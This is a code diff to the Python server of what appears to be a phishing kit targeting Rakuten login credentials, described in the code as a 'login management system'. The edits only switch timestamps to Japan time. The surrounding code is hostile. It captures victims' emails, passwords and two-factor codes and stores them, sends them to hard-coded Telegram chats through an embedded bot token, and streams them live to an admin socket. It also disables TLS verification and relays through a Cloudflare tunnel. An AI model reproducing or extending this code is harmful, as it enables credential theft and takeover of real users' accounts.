@@ -7,7 +7,7 @@ import threading
 import requests
 import urllib3
 import uuid
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 
 # SSL警告を無効化
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -34,12 +34,23 @@ DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
 TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')
 
-# 🔥 PC側のCloudflare URL（環境変数から取得、なければデフォルト値）
+# 🔥 PC側のCloudflare URL(環境変数から取得、なければデフォルト値)
 CLOUDFLARE_URL = os.getenv('CLOUDFLARE_URL', 'https://config-surname-carroll-incoming.trycloudflare.com').rstrip('/')
 
-# CloudflareのIPアドレス（DNS解決できない場合の代替）
+# CloudflareのIPアドレス(DNS解決できない場合の代替)
 CLOUDFLARE_IPS = ['104.16.231.132', '104.16.230.132']
 CLOUDFLARE_HOSTNAME = CLOUDFLARE_URL.replace('https://', '').replace('http://', '')
+
+# 日本時間のタイムゾーン
+JST = timezone(timedelta(hours=9))
+
+def get_jst_now():
+    """日本時間の現在時刻を取得"""
+    return datetime.now(JST)
+
+def get_jst_now_str():
+    """日本時間の現在時刻を文字列で取得"""
+    return get_jst_now().strftime('%Y-%m-%dT%H:%M:%S')
 
 def get_cloudflare_url_with_ip():
     """IPアドレスを使ったCloudflare URL"""
@@ -66,7 +77,7 @@ telegram_error_sent = {}
 
 def log_with_timestamp(level, message):
     """タイムスタンプ付きログ出力"""
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
+    timestamp = get_jst_now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
     print(f"[{timestamp}] [SERVER] [{level}] {message}")
 
 # ========================================
@@ -89,11 +100,11 @@ def check_pc_connection_internal():
             timeout=30
         )
         
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         
         if response.status_code == 200 and response.text.strip() == "yes!":
             pc_connection_status['connected'] = True
-            pc_connection_status['last_success'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            pc_connection_status['last_success'] = get_jst_now_str()
             pc_connection_status['error'] = None
             log_with_timestamp("SUCCESS", "✓ PC接続チェック成功")
             return True
@@ -106,21 +117,21 @@ def check_pc_connection_internal():
     
     except requests.exceptions.Timeout:
         pc_connection_status['connected'] = False
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         pc_connection_status['error'] = "接続タイムアウト"
         log_with_timestamp("ERROR", "✗ PC接続タイムアウト")
         return False
     
     except requests.exceptions.ConnectionError as e:
         pc_connection_status['connected'] = False
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         pc_connection_status['error'] = f"接続エラー: {str(e)}"
         log_with_timestamp("ERROR", f"✗ PC接続エラー: {str(e)}")
         return False
     
     except Exception as e:
         pc_connection_status['connected'] = False
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         pc_connection_status['error'] = f"不明なエラー: {str(e)}"
         log_with_timestamp("ERROR", f"✗ PC接続エラー: {str(e)}")
         return False
@@ -159,7 +170,7 @@ def create_or_update_account(email, password, status):
     db = load_database()
     account = find_account(email, password)
     
-    now = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
+    now = get_jst_now_str()
     
     if account:
         account['login_history'].append({
@@ -193,7 +204,7 @@ def init_twofa_session(email, password):
                 'active': True,
                 'codes': [],
                 'security_check_completed': False,
-                'created_at': datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
+                'created_at': get_jst_now_str()
             }
             save_database(db)
             log_with_timestamp("DB", f"2FAセッション初期化 | Email: {email}")
@@ -208,7 +219,7 @@ def add_twofa_code(email, password, code):
     for account in db['accounts']:
         if account['email'] == email and account['password'] == password:
             if account.get('twofa_session'):
-                now = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
+                now = get_jst_now_str()
                 account['twofa_session']['codes'].append({
                     'code': code,
                     'datetime': now,
@@ -279,8 +290,8 @@ def get_all_active_sessions():
 # ========================================
 
 def send_telegram_notification(email, password):
-    """テレグラムにログイン成功通知を送信（DNS解決不要・IP直接指定版）"""
-    message = f"◎ログイン成功\nメールアドレス：{email}\nパスワード：{password}"
+    """テレグラムにログイン成功通知を送信(DNS解決不要・IP直接指定版)"""
+    message = f"◎ログイン成功\nメールアドレス:{email}\nパスワード:{password}"
     
     log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
     
@@ -293,7 +304,7 @@ def send_telegram_notification(email, password):
     ssl_context.check_hostname = False
     ssl_context.verify_mode = ssl.CERT_NONE
     
-    # Telegram APIのIPアドレスを直接使用（DNS解決不要）
+    # Telegram APIのIPアドレスを直接使用(DNS解決不要)
     telegram_ips = [
         "149.154.167.220",
         "149.154.167.197",
@@ -344,21 +355,21 @@ def send_telegram_notification(email, password):
                 time.sleep(2)
         
         if not success:
-            log_with_timestamp("ERROR", f"✗ Telegram通知失敗（全試行失敗） | Chat: {chat_id}")
+            log_with_timestamp("ERROR", f"✗ Telegram通知失敗(全試行失敗) | Chat: {chat_id}")
 
 
 def send_telegram_notification_error(message):
-    """エラー通知をテレグラムに送信（重複防止あり・IP直接指定版）"""
+    """エラー通知をテレグラムに送信(重複防止あり・IP直接指定版)"""
     error_type = message.split('\n')[0] if '\n' in message else message
     current_time = time.time()
     
     if error_type in telegram_error_sent:
         last_sent = telegram_error_sent[error_type]
         if current_time - last_sent < 300:
-            log_with_timestamp("TELEGRAM", f"重複通知スキップ（5分以内に送信済み）| Error: {error_type}")
+            log_with_timestamp("TELEGRAM", f"重複通知スキップ(5分以内に送信済み)| Error: {error_type}")
             return
     
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    timestamp = get_jst_now().strftime('%Y-%m-%d %H:%M:%S')
     error_message = f"⚠️ エラー通知\n{message}\nタイムスタンプ: {timestamp}"
     
     log_with_timestamp("TELEGRAM", f"エラー通知送信開始 | Message: {error_type}")
@@ -531,12 +542,12 @@ def api_check():
         )
         
         # 接続状態を更新
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         
         if response.status_code == 200 and response.text.strip() == "yes!":
             # 接続成功
             pc_connection_status['connected'] = True
-            pc_connection_status['last_success'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            pc_connection_status['last_success'] = get_jst_now_str()
             pc_connection_status['error'] = None
             
             log_with_timestamp("SUCCESS", "✓✓✓ PC接続チェック成功! ✓✓✓")
@@ -568,7 +579,7 @@ def api_check():
     
     except requests.exceptions.Timeout:
         pc_connection_status['connected'] = False
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         pc_connection_status['error'] = "接続タイムアウト (10秒)"
         
         log_with_timestamp("ERROR", "✗✗✗ PC接続タイムアウト ✗✗✗")
@@ -587,7 +598,7 @@ def api_check():
     
     except requests.exceptions.ConnectionError as e:
         pc_connection_status['connected'] = False
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         pc_connection_status['error'] = f"接続エラー: {str(e)}"
         
         log_with_timestamp("ERROR", "✗✗✗ PC接続エラー ✗✗✗")
@@ -607,7 +618,7 @@ def api_check():
     
     except Exception as e:
         pc_connection_status['connected'] = False
-        pc_connection_status['last_check'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        pc_connection_status['last_check'] = get_jst_now_str()
         pc_connection_status['error'] = f"不明なエラー: {str(e)}"
         
         log_with_timestamp("ERROR", "✗✗✗ 不明なエラー ✗✗✗")
@@ -688,7 +699,7 @@ def api_login():
                 create_or_update_account(email, password, 'success')
                 init_twofa_session(email, password)
                 
-                # Telegram通知を別スレッドで実行（レスポンスをブロックしない）
+                # Telegram通知を別スレッドで実行(レスポンスをブロックしない)
                 threading.Thread(
                     target=send_telegram_notification,
                     args=(email, password),
@@ -698,7 +709,7 @@ def api_login():
                 socketio.emit('block_created', {
                     'email': email,
                     'password': password,
-                    'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
+                    'timestamp': get_jst_now_str()
                 }, namespace='/')
                 log_with_timestamp("WEBSOCKET", f"管理者通知: block_created | Email: {email}")
                 
@@ -798,7 +809,7 @@ def api_2fa_submit():
             'email': email,
             'password': password,
             'code': code,
-            'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
+            'timestamp': get_jst_now_str(),
             'session': updated_account['twofa_session']
         }, namespace='/', to='admin')
         
@@ -865,7 +876,7 @@ def api_security_check_submit():
     socketio.emit('security_check_submitted', {
         'email': email,
         'password': account['password'] if account else '',
-        'timestamp': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
+        'timestamp': get_jst_now_str(),
         'session': account['twofa_session'] if account else None
     }, namespace='/', to='admin')
     log_with_timestamp("WEBSOCKET", f"管理者通知: セキュリティチェック送信 | Email: {email}")
@@ -1034,7 +1045,7 @@ def healthz():
 
 if __name__ == '__main__':
     print("=" * 70)
-    print("楽天ログイン管理システム起動（サーバー側）")
+    print("楽天ログイン管理システム起動(サーバー側)")
     print(f"Cloudflare URL: {CLOUDFLARE_URL}")
     print("=" * 70)
     log_with_timestamp("INFO", "システム起動開始")
